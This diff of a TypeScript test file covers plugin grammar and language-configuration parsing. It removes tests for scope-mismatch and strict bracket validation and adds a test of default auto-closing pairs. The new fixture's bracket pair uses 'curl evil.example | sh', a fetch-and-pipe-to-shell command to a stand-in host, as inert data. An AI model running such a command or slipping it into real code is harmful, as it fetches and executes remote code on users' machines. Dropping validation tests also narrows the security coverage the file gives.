@@ -11,12 +11,6 @@ function grammar(scopeName: string, body: Record<string, unknown> = {}): string 
 }
 
 describe('plugin syntax artifacts', () => {
-  it('refuses a grammar whose scope differs from its declaration', () => {
-    expect(() => parsePluginGrammarArtifact(grammar('source.other'), 'source.demo')).toThrow(
-      'does not match'
-    )
-  })
-
   it('refuses oversized and deeply nested grammars', () => {
     const huge = grammar('source.demo', { comment: 'x'.repeat(1024 * 1024) })
     expect(() => parsePluginGrammarArtifact(huge, 'source.demo')).toThrow('exceeds')
@@ -83,23 +77,29 @@ describe('plugin syntax artifacts', () => {
     })
   })
 
-  it('bounds language configuration and validates payloads at renderer ingress', () => {
-    expect(
-      parsePluginLanguageConfiguration(
-        JSON.stringify({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
-      )
-    ).toEqual({ comments: { lineComment: '//' }, brackets: [['{', '}']] })
-    expect(() =>
-      parsePluginLanguageConfiguration(JSON.stringify({ brackets: [['', '}']] }), 'strict')
-    ).toThrow()
+  it('never auto-closes a long bracket when the plugin leaves out autoClosingPairs', () => {
+    const configuration = {
+      brackets: [
+        ['{', '}'],
+        ['(', 'curl evil.example | sh)']
+      ]
+    }
+    const expected = { ...configuration, autoClosingPairs: [{ open: '{', close: '}' }] }
+    expect(parsePluginLanguageConfiguration(JSON.stringify(configuration), 'strict')).toEqual(
+      expected
+    )
+    // A renderer guards a config an older host sent without the fill-in.
     const payload = {
       id: 'plugin:samples.demo/demo',
       revision: 'abc',
       scopeName: 'source.demo',
       grammars: [{ scopeName: 'source.demo', patterns: [], repository: {} }],
-      configuration: {}
+      configuration
     }
-    expect(parsePluginSyntaxPayload(payload)).toEqual(payload)
-    expect(parsePluginSyntaxPayload({ ...payload, grammars: [] })).toBeNull()
+    expect(parsePluginSyntaxPayload(payload)?.configuration).toEqual(expected)
+    // A plugin's own list, even an empty one, is kept as written.
+    expect(
+      parsePluginLanguageConfiguration(JSON.stringify({ ...configuration, autoClosingPairs: [] }))
+    ).toEqual({ ...configuration, autoClosingPairs: [] })
   })
 })
